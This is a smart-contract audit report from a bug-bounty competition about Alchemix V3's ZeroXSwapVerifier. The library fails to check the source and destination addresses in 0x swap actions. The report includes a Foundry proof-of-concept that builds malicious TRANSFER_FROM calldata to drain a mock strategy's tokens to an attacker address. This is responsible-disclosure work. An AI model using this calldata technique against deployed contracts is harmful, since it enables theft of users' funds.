# 58578 sc low zeroxswapverifier allows attackers to drain strategy tokens via crafted calldata

**Submitted on Nov 3rd 2025 at 10:31:12 UTC by @Lion47624 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58578
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

The ZeroXSwapVerifier library is designed to validate 0x swap calldata before execution. However, its verification functions fail to check critical parameters within the swap actions, specifically the source (from) and destination (to) addresses. This allows an attacker to craft a malicious 0x transaction that passes verification but transfers funds from the calling contract to an address of their choice, leading to a direct drain of assets.

## Vulnerability Details

*Component:* src/utils/ZeroXSwapVerifier.sol

*Affected Functions:*

* \_verifyTransferFrom
* \_verifySellToLiquidityProvider
* \_verifyBasicSellToPool
* \_verifyUniswapV3VIP
* \_verifyVelodromeV2VIP

The core of the issue lies in the incomplete validation within the helper functions that verify individual 0x actions. For example, the \_verifyTransferFrom function only checks that the token being transferred matches the expected targetToken.

*File: src/utils/ZeroXSwapVerifier.sol* solidity // ...existing code... /\*\* \* @dev Verify TRANSFER\_FROM action \* Format: transferFrom(IERC20 token, address from, address to, uint256 amount) \*/ function \_verifyTransferFrom(bytes memory action, address owner, address targetToken, uint256 targetAmount) internal view { (address token, , , uint256 amount) = abi.decode( \_slice(action, 4), (address, address, address, uint256) );

```
    require(token == targetToken, "IT");
    // BUG: The 'from' and 'to' addresses are decoded but never validated.
    // An attacker can set 'from' to be the victim contract and 'to' to be their own address.
}
```

// ...existing code...

As shown above, the from and to parameters are ignored. An attacker can supply calldata where from is the address of the contract using the verifier (the owner) and to is the attacker's address. Since the token address check will pass, the verifier will incorrectly approve the malicious action.

## Impact Details

This vulnerability allows for the theft of all tokens that a contract, which relies on ZeroXSwapVerifier, has approved for the 0x protocol. It completely undermines the security purpose of the verifier library.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/utils/ZeroXSwapVerifier.sol#L238-L246>

## Proof of Concept

## Proof of Concept

create a new poc.t.sol file in the test folder, copy and paste the following test suite and run `forge test --mt test_canDrainFundsViaMalformedTransferFrom`. The test proves that the verifier fails to check the from address in the swap data, allowing the attacker to specify the strategy contract itself as the source of the funds to be stolen.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
import {TestERC20} from "./mocks/TestERC20.sol";

/// @notice Minimal stand-in for the real 0x Settler contract used during swaps.
/// @dev The real settler executes a list of encoded "actions". I only implement
/// the behaviour needed for this exploit: forwarding TRANSFER_FROM calls.
contract MockSwapExecutor {
    bytes4 private constant TRANSFER_FROM_SELECTOR = 0x8d68a156;

    // Fallback to handle the 0x protocol's execute function
    // The verifier uses EXECUTE_SELECTOR = 0xcf71ff4f but the actual signature varies
    fallback() external {
        // In production the first 4 bytes contain the selector. Skip it and decode
        // the rest as execute(SlippageAndActions, bytes[]) just like 0x does.
        bytes calldata callPayload = msg.data[4:];
        (ZeroXSwapVerifier.SlippageAndActions memory swapActions, ) =
            abi.decode(callPayload, (ZeroXSwapVerifier.SlippageAndActions, bytes[]));
        _processEncodedActions(swapActions.actions);
    }

    function _processEncodedActions(bytes[] memory encodedActions) internal {
        for (uint256 i = 0; i < encodedActions.length; i++) {
            bytes4 actionSelector = bytes4(encodedActions[i]);
            if (actionSelector == TRANSFER_FROM_SELECTOR) {
                // Each action is ABI-encoded. Strip the selector and decode the payload
                // as (token, from, to, amount) exactly like the real 0x TRANSFER_FROM.
                (address asset, address source, address destination, uint256 quantity) =
                    abi.decode(_getPayloadFromAction(encodedActions[i]), (address, address, address, uint256));
                IERC20(asset).transferFrom(source, destination, quantity);
            } else {
                revert("unsupported action");
            }
        }
    }

    function _getPayloadFromAction(bytes memory callPayload) internal pure returns (bytes memory) {
        bytes memory payload = new bytes(callPayload.length - 4);
        for (uint256 i = 4; i < callPayload.length; i++) {
            payload[i - 4] = callPayload[i];
        }
        return payload;
    }
}

/// @notice Simple strategy that mirrors how production strategies integrate with the verifier.
/// @dev The important detail is the unlimited approval to the settler, which the attacker abuses.
contract VulnerableStrategy {
    IERC20 public immutable assetContract;
    address public immutable swapExecutor;

    constructor(IERC20 _asset, address _executor) {
        assetContract = _asset;
        swapExecutor = _executor;
        _asset.approve(_executor, type(uint256).max);
    }

    function fundStrategy(uint256 depositAmount) external {
        require(assetContract.transferFrom(msg.sender, address(this), depositAmount), "deposit failed");
    }

    function performSwap(bytes calldata swapData, uint256 slippageTolerance) external {
        // Step 1: ask the verifier whether the calldata looks safe.
        bool isVerified =
            ZeroXSwapVerifier.verifySwapCalldata(swapData, address(this), address(assetContract), slippageTolerance);
        require(isVerified, "verification failed");

        // Step 2: forward the calldata to the (mocked) 0x settler. If the verifier
        // missed a malicious action, the settler will happily execute it.
        (bool executionSuccess, ) = swapExecutor.call(swapData);
        require(executionSuccess, "settler call failed");
    }
}

contract VerifierVulnerabilityTest is Test {
    bytes4 private constant EXECUTE_CALL_SELECTOR = 0xcf71ff4f; // 0x protocol's execute selector
    bytes4 private constant TRANSFER_FROM_SELECTOR = 0x8d68a156;

    TestERC20 internal testToken;
    MockSwapExecutor internal mockExecutor;
    VulnerableStrategy internal vulnerableContract;
    address internal maliciousActor = address(0xBEEF);

    function setUp() public {
        testToken = new TestERC20(1_000e18, 18);
        mockExecutor = new MockSwapExecutor();
        vulnerableContract = new VulnerableStrategy(IERC20(address(testToken)), address(mockExecutor));

        // Fund strategy with 100 tokens
        testToken.transfer(address(vulnerableContract), 100e18);

        // Give attacker some ether for calls (not strictly needed but realistic)
        vm.deal(maliciousActor, 1 ether);
    }

    function test_canDrainFundsViaMalformedTransferFrom() public {
        uint256 initialStrategyBalance = testToken.balanceOf(address(vulnerableContract));
        uint256 initialAttackerBalance = testToken.balanceOf(maliciousActor);

        // Build calldata that masquerades as a valid 0x swap but contains a single
        // TRANSFER_FROM action that steals every token from the strategy.
        bytes memory exploitPayload = _constructExploitPayload(
            address(testToken),
            address(vulnerableContract),
            maliciousActor,
            initialStrategyBalance
        );

        // Keeper / governance triggers what they think is a safe swap. The verifier
        // returns true, so the strategy forwards the payload to the settler.
        vulnerableContract.performSwap(exploitPayload, 1_000); // 10% max slippage

        uint256 finalStrategyBalance = testToken.balanceOf(address(vulnerableContract));
        uint256 finalAttackerBalance = testToken.balanceOf(maliciousActor);

        assertEq(finalStrategyBalance, 0, "Strategy should be drained");
        assertEq(finalAttackerBalance - initialAttackerBalance, initialStrategyBalance, "attacker gains entire balance");
    }

    function _constructExploitPayload(
        address assetAddress,
        address sourceAddress,
        address destinationAddress,
        uint256 transferAmount
    ) internal pure returns (bytes memory) {
        // 1. Encode a TRANSFER_FROM action that drains from -> to.
        bytes memory encodedAction =
            abi.encodeWithSelector(TRANSFER_FROM_SELECTOR, assetAddress, sourceAddress, destinationAddress, transferAmount);

        // 2. Wrap the action in the SlippageAndActions struct required by the
        //    verifier/settler pipeline. No real swap occurs: the array contains
        //    just our malicious transfer.
        ZeroXSwapVerifier.SlippageAndActions memory actionsContainer = ZeroXSwapVerifier.SlippageAndActions({
            recipient: destinationAddress,
            buyToken: address(0),
            minAmountOut: 0,
            actions: new bytes[](1)
        });
        actionsContainer.actions[0] = encodedAction;

        // 3. Finally encode the full calldata for 0x's execute(...) entry point.
        return abi.encodeWithSelector(EXECUTE_CALL_SELECTOR, actionsContainer, new bytes[](0));
    }
}
```
